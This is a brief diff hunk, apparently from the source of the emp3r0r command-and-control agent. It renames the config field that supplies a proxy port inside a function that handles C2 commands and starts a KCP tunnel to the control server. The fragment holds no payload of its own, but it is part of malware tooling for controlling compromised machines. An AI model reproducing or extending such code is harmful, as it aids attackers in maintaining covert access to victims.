@@ -113,7 +113,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 			go tun.KCPTunClient(kcp_server_addr, kcp_listen_port, RuntimeConfig.Password, emp3r0r_def.MagicString, ctx, cancel)
 			util.TakeABlink() // wait for KCP to start
 		}
-		proxyPort, a2iErr := strconv.Atoi(RuntimeConfig.Emp3r0rProxyServerPort)
+		proxyPort, a2iErr := strconv.Atoi(RuntimeConfig.AgentSocksServerPort)
 		if a2iErr != nil {
 			out = fmt.Sprintf("Error: %v", a2iErr)
 			cancel()
